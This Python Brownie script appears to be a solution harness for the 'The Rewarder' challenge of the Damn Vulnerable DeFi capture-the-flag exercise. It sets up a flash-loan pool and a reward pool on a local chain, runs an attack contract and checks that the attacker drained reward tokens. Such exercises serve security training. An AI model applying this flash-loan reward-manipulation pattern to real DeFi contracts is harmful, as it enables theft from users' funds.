from brownie import (
    FlashLoanerPool,
    TheRewarderPool,
    DamnValuableToken,
    RewardToken,
    AccountingToken,
    AttackTheRewarder,
)
from web3 import Web3
from brownie import web3
from brownie.network.state import Chain
import time
from scripts.helpful_scripts import get_accounts


def deploy():
    global deployer, alice, bob, charlie, attacker, users, therewarderPool, therewardToken, liquidityToken, flashLoanPool
    [
        deployer,
        alice,
        bob,
        charlie,
        david,
        attacker,
    ] = get_accounts(6)
    users = [alice, bob, charlie, david]
    # Pool has 1M * 10**18 tokens
    TOKENS_IN_LENDER_POOL = Web3.toWei(1000000, "ether")

    # 开始部署
    liquidityToken = DamnValuableToken.deploy({"from": deployer})
    flashLoanPool = FlashLoanerPool.deploy(liquidityToken, {"from": deployer})

    # Set initial token balance of the pool offering flash loans
    liquidityToken.transfer(flashLoanPool, TOKENS_IN_LENDER_POOL, {"from": deployer})

    therewarderPool = TheRewarderPool.deploy(liquidityToken, {"from": deployer})

    # 文档： https://eth-brownie.readthedocs.io/en/stable/api-network.html#contractcontainer
    therewardToken = RewardToken.at(therewarderPool.rewardToken())
    accountingToken = AccountingToken.at(therewarderPool.accToken())
    for user in users:
        amount = Web3.toWei(100, "ether")
        liquidityToken.transfer(user, amount, {"from": deployer}).wait(1)
        liquidityToken.approve(therewarderPool, amount, {"from": user}).wait(1)
        therewarderPool.deposit(amount, {"from": user}).wait(1)
        assert accountingToken.balanceOf(user) == amount

    assert accountingToken.totalSupply() == Web3.toWei(400, "ether")
    assert therewardToken.totalSupply() == 0

    # 在区块链上的timestap 增加5天
    sec_5_days = 5 * 24 * 60 * 60
    web3.provider.make_request("evm_increaseTime", [sec_5_days])

    for user in users:
        therewarderPool.distributeRewards({"from": user}).wait(1)
        assert therewardToken.balanceOf(user) == Web3.toWei(25, "ether")

    assert therewardToken.totalSupply() == Web3.toWei(100, "ether")
    assert therewarderPool.roundNumber() == 2

    return


def attack():
    # 攻击代码写到这里
    print("running func attack..")
    # 在区块链上的timestap 增加5天
    sec_5_days = 5 * 24 * 60 * 60
    web3.provider.make_request("evm_increaseTime", [sec_5_days])
    attack_contract = AttackTheRewarder.deploy({"from": attacker})
    attack_contract.attack(
        liquidityToken,
        therewardToken,
        flashLoanPool,
        therewarderPool,
        {"from": attacker},
    ).wait(1)

    return


def check():
    # 检测攻击是否完成
    print("running func check..")
    try:
        assert therewarderPool.roundNumber() == 3
        for user in users:
            therewarderPool.distributeRewards({"from": user}).wait(1)
            assert therewardToken.balanceOf(user) == Web3.toWei(25, "ether")
        assert therewardToken.totalSupply() > Web3.toWei(100, "ether")
        assert therewardToken.balanceOf(attacker) > 0
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
